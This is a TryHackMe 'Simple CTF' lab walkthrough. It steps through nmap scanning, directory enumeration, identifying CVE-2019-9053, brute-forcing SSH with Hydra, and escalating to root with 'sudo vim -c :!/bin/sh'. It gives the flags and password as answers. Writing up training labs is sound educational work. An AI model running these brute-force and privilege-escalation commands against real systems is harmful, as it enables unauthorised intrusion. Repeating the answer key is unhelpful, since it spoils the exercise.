# Simple CTF — TryHackMe Walkthrough

> **Room:** Simple CTF  
> **Platform:** TryHackMe  
> **Difficulty:** Easy  
> **Tags:** `nmap` `dirsearch` `hydra` `ssh` `privilege-escalation` `vim` `gtfobins`

---

## Table of Contents

1. [Reconnaissance](#1-reconnaissance)
2. [Web Enumeration](#2-web-enumeration)
3. [Finding the CVE](#3-finding-the-cve)
4. [Cracking Credentials](#4-cracking-credentials)
5. [Initial Access via SSH](#5-initial-access-via-ssh)
6. [Privilege Escalation](#6-privilege-escalation)
7. [Flags Summary](#7-flags-summary)

---

## 1. Reconnaissance

### Q: How many services are running under port 1000?

Run an Nmap scan targeting ports below 1000:

```bash
sudo nmap 10.10.163.70 -sV -p-1000 -sC
```

**Answer:** `2` (FTP and HTTP)

---

### Q: What is running on the higher port?

Run a broader Nmap scan to find services on higher ports:

```bash
sudo nmap 10.10.163.70 -sV -sC
```

This reveals SSH running on port **2222**.

**Answer:** `SSH`

---

## 2. Web Enumeration

The web server's default page didn't reveal anything useful, so we use **dirsearch** to find hidden directories:

```bash
dirsearch -u 10.10.163.70 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -r
```

This uncovers a hidden path hosting a **CMS (Content Management System)**. Navigate to it in the browser and check the page footer to identify the CMS version.

---

## 3. Finding the CVE

### Q: What's the CVE you're using against the application?

With the CMS name and version in hand, search for known exploits:

```bash
searchsploit <cms-name> <version>
```

> 💡 **Tip:** OpenSSH and Apache2 didn't have applicable exploits here — the CMS was the attack vector.

**Answer:** `CVE-2019-9053`

---

### Q: What kind of vulnerability is the application vulnerable to?

Looking up the CVE on [CVE Details](https://www.cvedetails.com/) confirms the vulnerability type.

**Answer:** `SQLi` (SQL Injection)

---

## 4. Cracking Credentials

### Q: What's the password?

FTP allows **anonymous login**, but SSH requires valid credentials. One of the CMS articles reveals an author's name — **mitch** — which we can try as a username.

Use **Hydra** to brute-force the SSH password:

```bash
hydra -l mitch -P /usr/share/wordlists/rockyou.txt ssh://10.10.163.70:2222 -t 4
```

**Answer:** `secret`

---

### Q: Where can you login with the details obtained?

**Answer:** `SSH`

---

## 5. Initial Access via SSH

### Q: What's the user flag?

Log in with the discovered credentials:

```bash
ssh mitch@10.10.163.70 -p 2222
```

Once inside, the user flag is in the home directory:

```bash
cat user.txt
```

**Answer:** `G00d j0b, keep up!`

---

### Q: Is there any other user in the home directory? What's its name?

Check the `/home` directory for other users:

```bash
ls -lh /home
```

**Answer:** `sunbath`

---

## 6. Privilege Escalation

### Q: What can you leverage to spawn a privileged shell?

First, stabilize your shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Check what commands the current user can run with `sudo`:

```bash
sudo -l
```

This shows that `mitch` can run **vim** as root.

**Answer:** `vim`

---

### Q: What's the root flag?

Reference [GTFOBins — vim](https://gtfobins.github.io/gtfobins/vim/) to find the privilege escalation command:

```bash
sudo vim -c ':!/bin/sh'
```

This drops you into a root shell. Stabilize again, then navigate to the root directory:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
cat /root/root.txt
```

**Answer:** `W3ll d0n3. You made it!`

---

## 7. Flags Summary

| Flag       | Value                        |
|------------|------------------------------|
| User Flag  | `G00d j0b, keep up!`         |
| Root Flag  | `W3ll d0n3. You made it!`    |

---

## Tools Used

| Tool         | Purpose                          |
|--------------|----------------------------------|
| `nmap`       | Port & service scanning          |
| `dirsearch`  | Web directory enumeration        |
| `searchsploit` | Exploit search                 |
| `hydra`      | SSH brute-force                  |
| `ssh`        | Remote login                     |
| `vim`        | Privilege escalation via GTFOBins|

---

## Key Takeaways

- Always scan **all ports**, not just common ones — SSH was hiding on port 2222.
- CMS installations often have **known CVEs**; check the version carefully.
- Author names on public-facing web pages can **leak valid usernames**.
- `sudo -l` is one of the first things to check during privilege escalation.
- [GTFOBins](https://gtfobins.github.io/) is an essential reference for `sudo` abuse.

---

*Walkthrough by [Your Name] | TryHackMe: [Your Profile Link]*
